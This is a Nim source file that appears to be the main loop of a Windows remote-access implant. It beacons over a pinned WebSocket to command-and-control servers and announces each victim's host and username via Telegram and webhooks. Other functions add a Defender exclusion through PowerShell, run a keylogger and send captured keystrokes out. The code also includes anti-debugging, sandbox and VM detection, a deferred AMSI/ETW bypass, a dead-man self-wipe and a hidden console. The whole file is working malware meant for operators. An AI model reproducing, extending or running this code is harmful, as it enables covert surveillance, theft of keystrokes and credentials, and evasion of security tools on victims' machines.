    let path = tmpDir / ("svc-cache-" & $getCurrentProcessId() & ".pem")
    try:
      let f = open(path, fmWrite)
      defer: f.close()
      f.write(PINNED_CERT_PEM)
      pinnedCertPath = path
      return path
    except:
      return ""

  proc connectPinnedWebSocket(url: string): Future[WebSocket] {.async.} =
    # Parse the URL ourselves so we own the TLS layer.
    let uri = parseUri(url)
    let isWss = uri.scheme.toLowerAscii() == "wss"
    if not isWss or PINNED_CERT_PEM.len == 0:
      # No pinning needed -> fall back to the ws library's path.
      return await newWebSocket(url)

    # Resolve port (default 443 for wss, overridable via URI).
    let port = if uri.port.len > 0: Port(parseInt(uri.port)) else: Port(443)
    let host = if uri.hostname.len > 0: uri.hostname else: "127.0.0.1"

    # Open a raw TCP socket and connect.
    let sock = newAsyncSocket()
    await sock.connect(host, port)

    # Build the pinned SSL context. caFile = ONLY the pinned cert
    # (no system store appending, which is the whole point of pinning).
    let certPath = ensurePinnedCertFile()
    if certPath.len == 0:
      sock.close()
      raise newException(IOError, "pin: cert write failed")
    let ctx = newContext(verifyMode = CVerifyPeer, caFile = certPath)
    if ctx == nil:
      sock.close()
      raise newException(IOError, "pin: SSL context create failed")
    # Wrap + perform handshake as a client. SNI is sent so the server
    # can still serve the right vhost (though we only accept the one
    # pinned cert chain regardless).
    wrapConnectedSocket(ctx, sock, handshakeAsClient, host)

    # Send the WebSocket upgrade request manually (the ws library's
    # path goes through newAsyncHttpClient which uses its own SSL setup;
    # here we control the socket ourselves).
    var secStr = newString(16)
    for i in 0 ..< secStr.len: secStr[i] = char rand(255)
    let secKey = base64.encode(secStr)
    let pathPart = if uri.path.len > 0: uri.path else: "/"
    let req =
      "GET " & pathPart & " HTTP/1.1\r\n" &
      "Host: " & host & (if uri.port.len > 0: ":" & uri.port else: "") & "\r\n" &
      "Upgrade: websocket\r\n" &
      "Connection: Upgrade\r\n" &
      "Sec-WebSocket-Version: 13\r\n" &
      "Sec-WebSocket-Key: " & secKey & "\r\n\r\n"
    await sock.send(req)

    # Read the HTTP response (until \r\n\r\n).
    var headers = ""
    while not (contains(headers, "\r\n\r\n")):
      let chunk = await sock.recv(1)
      if chunk.len == 0:
        sock.close()
        raise newException(IOError, "pin: upgrade response EOF")
      headers.add(chunk)
      if headers.len > 8192:
        sock.close()
        raise newException(IOError, "pin: upgrade response too large")

    let statusLine = headers.split("\r\n", 1)[0]
    if "101" notin statusLine:
      sock.close()
      raise newException(IOError, "pin: upgrade failed: " & statusLine)
    let upgrade = headers.toLowerAscii()
    if "upgrade: websocket" notin upgrade:
      sock.close()
      raise newException(IOError, "pin: not a WebSocket upgrade")

    # Hand the wrapped socket off to the ws library's WebSocket object
    # so the rest of the agent code (ws.send / ws.recvFrame / etc.) is
    # unchanged. masked=true matches what ws.newWebSocket sets.
    var ws: WebSocket
    ws = WebSocket()
    ws.masked = true
    ws.tcpSocket = sock
    ws.readyState = Open
    return ws
else:
  # Non-windows build: no pinning, fall back to ws.newWebSocket.
  proc connectPinnedWebSocket(url: string): Future[WebSocket] {.async.} =
    return await newWebSocket(url)

proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.} =
  var ws: WebSocket = nil
  try:
    ws = await connectPinnedWebSocket(url)
  except:
    return

  # Send registration
  let info = getSystemInfo()
  let payload = $info
  let ourNonce: array[16, byte] = block:
    var n: array[16, byte]
    for i in 0..<16: n[i] = rand(255).byte
    n
  let anB64 = base64.encode(ourNonce)
  # Server checks: HMAC over the payload string + expects an "an" field for the nonce
  let hmacHex = hmacHex(agentSecret(), payload)
  let regFrame = $ %* {"p": payload, "h": hmacHex, "an": anB64}

  try:
    # Registration is PLAINTEXT — the server doesn't encrypt it either.
    # Encryption starts after we derive the session key.
    await ws.send(regFrame)
  except:
    ws.close()
    return

  # Receive registration ack (with server_nonce) — plaintext
  let recvFut = ws.receiveStrPacket()
  let ok = await withTimeout(recvFut, 10000)
  if not ok:
    # Nim 2.x: Future.cancel was removed. The future will complete (with
    # failure) on its own when the underlying recv returns; just close
    # the socket to short-circuit it.
    ws.close()
    return
  let ackBlob = recvFut.read
  if ackBlob.len == 0:
    ws.close()
    return
  let ack = parseJson(ackBlob)
  if (if ack.hasKey("status"): ack["status"].getStr() else: "") != "registered":
    ws.close()
    return

  sc.agentId = ack["agent_id"].getStr()
  let snB64 = ack["sn"].getStr()
  let sn = hexToBytes(snB64)
  if sn.len != 16:
    ws.close()
    return
  for i in 0..<16: sc.peerNonce[i] = sn[i]

  # Derive session key. Both sides must use the same canonical order:
  # HMAC(secret, server_nonce || agent_nonce). The server does this with
  # (sn, ourAgentNonce); the agent does it with (sn, ourAgentNonce) too.
  sc.key = deriveSessionKey(agentSecret(), sn, ourNonce)

  echo "[" & BuildPrefix & "] registered as ", sc.agentId
  # Update last-contact timestamp on successful C2 registration.
  # This is the dead-man's switch heartbeat — if the agent goes
  # DEAD_MAN_SECS without getting this far, it self-destructs.
  meta.lastContact = getTime().toUnix
  try: saveMeta(meta[]) except: discard
  if telegramEnabled():
    let h = getHostname()
    let u = getEnv("USERNAME", "?")
    discard telegramSend("[X7K agent] " & sc.agentId & " " & h & "/" & u)
  if webhookEnabled():
    let h = getHostname()
    let u = getEnv("USERNAME", "?")
    discard webhookSend("[" & BuildPrefix & "] agent " & sc.agentId & " " & h & "/" & u)

  # Persistence: only on first connect (META_FILE is the gate)
  # and only if the operator has explicitly enabled it. The flag
  # AUTO_PERSIST defaults to FALSE — running the persistence
  # mechanism on every beacon is signatured behavior.
  if not fileExists(META_FILE) and AUTO_PERSIST:
    try: establishPersistence() except: agentLog("persist failed: " & getCurrentExceptionMsg())

  # One-time Defender exclusion: only if the operator opted in.
  # Adds our install path to Defender's exclusion list. Requires
  # the agent to be running elevated. If not elevated, no-op.
  when defined(windows):
    if ADD_DEFENDER_EXCLUSION and not fileExists(META_FILE & ".excl_done"):
      try:
        let installPath = if meta.copyPath.len > 0: meta.copyPath
                          else: getAppFilename()
        let installDir = installPath.parentDir
        let psCmd = "powershell -NoProfile -Command \"Add-MpPreference -ExclusionPath '" &
                    installDir & "'\""
        let (outp, code) = execCmdEx(psCmd, options = {poStdErrToStdOut})
        agentLog("defender excl: code=" & $code & " out=" & outp.strip)
        writeFile(META_FILE & ".excl_done", "1")
      except:
        agentLog("defender excl: " & getCurrentExceptionMsg())

  # Start keylogger — only if operator enabled it. The global
  # keyboard hook is signatured by every major AV/EDR.
  if AUTO_KEYLOG and not keyloggerRunning: startKeylogger()

  # Now: the session crypto is keyed. From here on, every send/recv
  # is via encryptFrame/decryptFrame.
  var sendLock = false
  var closed = false
  proc sendToC2(msg: JsonNode) {.async, gcsafe.} =
    if closed or sendLock: return
    sendLock = true
    try:
      await ws.send(cast[string](encryptFrame(sc, $msg)))
    except: closed = true
    finally: sendLock = false

  # Receive and dispatch commands in a separate task. Previously
  # this was a single loop with `withTimeout(receiveStrPacket,
  # BEACON_INTERVAL)`, but that approach leaks the receive future
  # when the timeout fires (Nim 2.x has no Future.cancel), and
  # multiple concurrent receives on the same WebSocket confuse the
  # library. Splitting into a dedicated task means there's exactly
  # one outstanding receive at a time.
  proc receiverTask() {.async, gcsafe.} =
    while not closed:
      {.cast(gcsafe).}:
        try:
          let plain = await ws.receiveStrPacket()
          if plain.len == 0:
            agentLog("recv: empty frame, closing")
            closed = true
            return
          let dec = decryptFrame(sc, cast[seq[byte]](plain))
          if dec.len == 0:
            agentLog("recv: decrypt failed (auth tag mismatch?)")
            continue
          try:
            let c = parseJson(dec)
            await handleCommand(sc, c, sendToC2, meta)
          except:
            agentLog("recv: handler exception: " & getCurrentExceptionMsg())
        except:
          agentLog("recv: receive exception: " & getCurrentExceptionMsg())
          closed = true
          return

  asyncCheck receiverTask()

  var lastBeacon = getTime().toUnix
  while not closed:
    # Sleep for the beacon interval, but check closed every 100ms
    # so we exit promptly when the receiver detects a disconnect.
    var sleptMs = 0
    while sleptMs < BEACON_INTERVAL * 1000 and not closed:
      await sleepAsync(100)
      sleptMs += 100

    if closed: break

    if getTime().toUnix - lastBeacon >= BEACON_INTERVAL:
      let kdata = drainKeylogger()
      var msgs: seq[JsonNode] = @[%* {"type": "heartbeat"}]
      if kdata.len > 0: msgs.add(%* {"type": "output", "data": "[" & BuildPrefix & " K] " & kdata})
      for m in msgs:
        try:
          await ws.send(cast[string](encryptFrame(sc, $m)))
        except:
          agentLog("heartbeat send failed: " & getCurrentExceptionMsg())
          closed = true; break
      lastBeacon = getTime().toUnix

  closed = true
  try: ws.close() except: discard

# ------------------------------------------------------------
# OPSEC: anti-debug, anti-VM, panic, secure memory zeroing
# ------------------------------------------------------------
# Survival on a real target device. None of this is silver-bullet
# (modern EDRs fingerprint these techniques) but each raises the cost
# of static analysis and deters casual sandbox detonation.

when defined(windows):
  const
    # ProcessDebugPort (informational, often 0 for non-debugged)
    PROCESS_DEBUG_PORT = 0x07

  proc isDebuggerPresent(): bool =
    # 1. Win32 IsDebuggerPresent (fast, exposed by kernel32)
    if IsDebuggerPresent() != 0: return true
    # Note: the deeper PEB checks (BeingDebugged, NtGlobalFlag) are
    # commented out — they need inline gs: segment reads which Nim's
    # asm block doesn't support cleanly. They add marginal value
    # since the anti-VM markers + sandbox username + timing checks
    # catch the realistic sandbox-detonation scenarios.
    return false

  proc checkRemoteDebugger(): bool =
    # NtQueryInformationProcess with ProcessDebugPort. Resolved
    # dynamically so we don't need a static ntdll import (which
    # an analyst can hook).
    try:
      var ntdll = obfDec(S_NTDLL)
      var procName = obfDec(S_NTQIP)
      let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
      if hMod == 0: return false
      let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
      if pAddr == nil: return false
      type NtQIP = proc(handle: HANDLE, infoClass: DWORD, info: LPVOID,
                        infoLen: DWORD, retLen: ptr DWORD): NTSTATUS {.stdcall.}
      let fn = cast[NtQIP](pAddr)
      var dbgPort: DWORD = 0
      var retLen: DWORD = 0
      let status = fn(GetCurrentProcess(), PROCESS_DEBUG_PORT,
                      cast[LPVOID](addr dbgPort),
                      DWORD(sizeof(dbgPort)), addr retLen)
      if status == 0 and dbgPort != 0: return true
    except: discard
    return false

  proc checkNtGlobalFlag(): bool =
    # PEB->NtGlobalFlag at offset 0xBC on x64. Detects debuggers
    # that set FLG_HEAP_ENABLE_TAIL_CHECK |
    # FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
    # (0x70). We resolve NtCurrentTeb via ntdll at runtime to
    # avoid a static ntdll import that an analyst can hook.
    try:
      type NtCTType = proc(): pointer {.stdcall.}
      var ntdll = obfDec(S_NTDLL)
      var procName = obfDec(S_NTCTEB)
      let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
      if hMod == 0: return false
      let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
      if pAddr == nil: return false
      let ntct = cast[NtCTType](pAddr)
      let teb = ntct()
      if teb == nil: return false
      when defined(amd64):
        let off = 0xBC
      else:
        let off = 0x68
      var f: uint32 = 0
      let p = cast[pointer](cast[int](teb) + off.int)
      copyMem(addr f, p, 4)
      if (f and 0x70'u32) != 0: return true
    except: discard
    return false

  proc checkSandboxMarkers(): bool =
    # Cheap, well-known sandbox/VM markers. None are definitive on
    # their own — combine with timing + behavioural checks for higher
    # confidence. We only abort on multiple signals to reduce false
    # positives on legit corporate targets.
    var hits = 0
    let paths = [
      obfDec(S_BOX_1), obfDec(S_BOX_2), obfDec(S_BOX_3), obfDec(S_BOX_4),
      obfDec(S_BOX_5), obfDec(S_BOX_6), obfDec(S_BOX_7), obfDec(S_BOX_8),
      obfDec(S_BOX_9), obfDec(S_BOX_10), obfDec(S_BOX_11)
    ]
    for p in paths:
      if fileExists(p): inc hits
    # Common sandbox usernames / hostnames
    let sandboxUsers = ["sandbox", "virus", "malware", "maltest", "currentuser"]
    let userLower = getEnv("USERNAME", "").toLowerAscii
    for u in sandboxUsers:
      if userLower.contains(u): inc hits
    let sandboxHosts = ["sandbox", "virus", "cuckoo", "maltest"]
    let hostLower = getHostname().toLowerAscii
    for h in sandboxHosts:
      if hostLower.contains(h): inc hits
    return hits >= 2

  proc checkTimingAnomaly(): bool =
    # Sandboxes often fast-forward time. We do a 1s sleep and verify
    # it took at least 800ms. A 1s sleep in <500ms means the sandbox
    # is manipulating clocks.
    let t0 = getMonoTime()
    sleep(1000)
    let elapsed = (getMonoTime() - t0).inMilliseconds
    return elapsed < 800

  proc antiAnalysisCheck(): bool =
    # Returns true if the environment looks hostile (debugger,
    # sandbox, VM). When true, the agent should bail out silently.
    if isDebuggerPresent(): return true
    if checkRemoteDebugger(): return true
    if checkNtGlobalFlag(): return true
    if checkSandboxMarkers(): return true
    if checkTimingAnomaly(): return true
    return false

  proc panicWipe() =
    # Operator-triggered self-destruct. Wipes all keys, persistence,
    # staged files, and exits. Called when the operator sends
    # `panic <id>` to the server.
    try:
      selfCleanup()
    except: discard
    # Best-effort: shred the meta file with random bytes before deletion
    if fileExists(META_FILE):
      try:
        let sz = getFileSize(META_FILE)
        var rnd = newSeq[byte](sz)
        for i in 0..<rnd.len:
          rnd[i] = (rand(255) and 0xFF).uint8
        var f = open(META_FILE, fmWrite)
        defer: f.close()
        discard f.writeBuffer(unsafeAddr rnd[0], rnd.len)
      except: discard
      try: removeFile(META_FILE) except: discard
    # Remove staged exfil data
    try:
      removeDir(getEnv("TEMP", "") / obfDec(S_SVC_DIR))
    except: discard
    # Remove our own log
    try: removeFile(getAgentLogPath()) except: discard
    agentLog("panic: full wipe complete, exiting")
    quit(0)
# /when defined(windows)

# Top-level no-op stub for non-Windows builds. Lets handleCommand
# reference panicWipe without a `when defined` per call site.
when not defined(windows):
  proc panicWipe() = discard

proc agentLoop() {.async.} =
  initLock(agentSecretLock)
  randomize()
  when defined(windows):
    # NOTE: AMSI bypass + ETW suppression are NOT applied at startup.
    # Patching amsi.dll!AmsiScanBuffer and ntdll!EtwEventWrite at
    # boot is a heavily-signatured behavior — every modern AV/EDR
    # detects the VirtualProtect + write pattern. Instead we apply
    # the bypass LAZILY, just before the first shell command, by
    # calling applyEvasionIfNeeded() from the shell handler. On
    # the first call, the patches go in; subsequent calls are
    # no-ops.

    # If the host looks like a sandbox / debugger / VM, exit silently
    # without performing any further action. We don't try to log or
    # contact the C2 — that's the whole point: behave like a no-op
    # binary so detonation tooling marks us as uninteresting.
    if antiAnalysisCheck():
      agentLog("analysis environment detected, bailing out")
      return

    # If Telegram is configured, send a "I'm alive" notification with
    # the current host + user so the operator has it on their phone
    # even before the WSS channel is up.
  var meta = new(MetaData)
  meta[] = loadMeta()
  var c2Idx = 0
  var fails = 0

  # Kill-date check
  if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
    selfCleanup()
    return

  # Dead-man's switch: if the agent hasn't contacted the C2 in
  # DEAD_MAN_SECS, shred self + persistence and exit. Prevents the
  # agent from lingering after the op ends (C2 seized, operator
  # lost access). Only fires if lastContact was ever set (non-zero).
  when defined(windows):
    if DEAD_MAN_SECS > 0 and meta.lastContact > 0:
      let elapsed = getTime().toUnix - meta.lastContact
      if elapsed >= DEAD_MAN_SECS:
        agentLog("dead-man trigger, self-destructing")
        panicWipe()  # shred + cleanup + quit

  # If Telegram is configured, send a "I'm alive" notification with
  # the current host + user so the operator has it on their phone
  # even before the WSS channel is up.
  when defined(windows):
    if telegramEnabled():
      let host = getHostname()
      let user = getEnv("USERNAME", "?")
      discard telegramSend("[X7K boot] " & host & " / " & user)
    # Webhook beacon: same boot notification, blends with corp traffic.
    if webhookEnabled():
      let host = getHostname()
      let user = getEnv("USERNAME", "?")
      discard webhookSend("[" & BuildPrefix & " boot] " & host & " / " & user)

  # Initial connection jitter (5-30 seconds) to avoid process-creation to network-connect correlation signatures
  let initialJitterMs = rand(25000) + 5000
  await sleepAsync(initialJitterMs)

  while true:
    if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
      selfCleanup()
      return

    # Create a fresh session crypto object for each connection
    let sc = SessionCrypto()
    let url = C2_URLS_RESOLVED[c2Idx mod C2_URLS_RESOLVED.len]
    await connectAndRun(sc, url, meta)
    inc c2Idx  # try next C2 on next reconnect

    # Sleep is interpreted as "wait at least this many minutes before
    # reconnecting after a drop". 0 = no artificial sleep.
    let sleepMs = meta.sleepMin * 60 * 1000
    let baseMs = int(computeDelay(fails) * 1000)
    let wait = max(baseMs, sleepMs)
    await sleepAsync(wait)
    inc fails

when isMainModule:
  when defined(windows):
    # Hide console if we're a console-subsystem build; in --app:gui mode
    # there's no console to hide.
    when not defined(gui):
      ShowWindow(GetConsoleWindow(), SW_HIDE)
  asyncCheck agentLoop()
  runForever()
